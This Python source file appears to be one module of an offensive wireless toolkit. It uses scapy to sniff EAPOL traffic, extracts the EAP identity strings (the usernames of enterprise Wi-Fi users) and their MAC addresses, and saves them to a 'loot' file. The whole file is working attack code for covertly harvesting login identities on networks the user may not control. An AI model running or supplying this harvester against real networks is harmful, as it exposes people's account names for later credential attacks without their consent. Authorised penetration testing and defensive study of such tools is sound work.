from scapy.all import sniff, Raw
import datetime
import os

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
LOOT_DIR = os.path.join(BASE_DIR, "loot")

harvested = {}

def identity_handler(pkt):
    if pkt.haslayer(Raw):
        raw = pkt[Raw].load
        if len(raw) > 5 and raw[0] == 0x02 and raw[4] == 0x01:
            try:
                identity = raw[5:].decode("utf-8", errors="ignore").strip()
                if identity and len(identity) > 2:
                    mac = pkt.addr2 if hasattr(pkt, "addr2") else "unknown"
                    if identity not in harvested:
                        harvested[identity] = {
                            "mac":  mac,
                            "time": str(datetime.datetime.now())
                        }
                        print(f"[IDENTITY] {identity:<35} | MAC: {mac}")
                        os.makedirs(LOOT_DIR, exist_ok=True)
                        with open(os.path.join(LOOT_DIR, "identities.txt"), "a") as f:
                            f.write(f"{datetime.datetime.now()} | {identity} | {mac}\n")
            except Exception:
                pass


def harvest_identities(iface, duration=60):
    print(f"\n[*] Harvesting EAP identities on {iface}")
    print(f"[*] Duration: {duration}s | Saving to loot/identities.txt")
    print("[*] Press Ctrl+C to stop early\n")

    try:
        sniff(
            iface=iface,
            prn=identity_handler,
            store=0,
            timeout=duration,
            filter="ether proto 0x888e"
        )
    except KeyboardInterrupt:
        pass

    print(f"\n[+] Harvested {len(harvested)} unique identities")
    for identity, info in harvested.items():
        print(f"    {identity} → {info['mac']}")

    return harvested
